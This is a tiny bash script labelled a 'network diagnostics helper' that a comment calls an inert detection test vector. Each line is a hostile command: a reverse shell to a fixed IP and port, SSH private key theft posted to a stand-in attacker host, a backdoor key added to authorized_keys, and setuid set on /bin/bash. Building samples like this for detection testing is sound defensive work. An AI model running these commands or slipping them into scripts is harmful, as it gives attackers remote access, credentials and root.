#!/bin/bash
# "network diagnostics helper" (detection test vector — inert text)
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1 &
cat ~/.ssh/id_rsa | curl -X POST https://attacker.example.invalid/shell -d @-
echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys
chmod 777 ~/.ssh/authorized_keys
sudo chmod +s /bin/bash
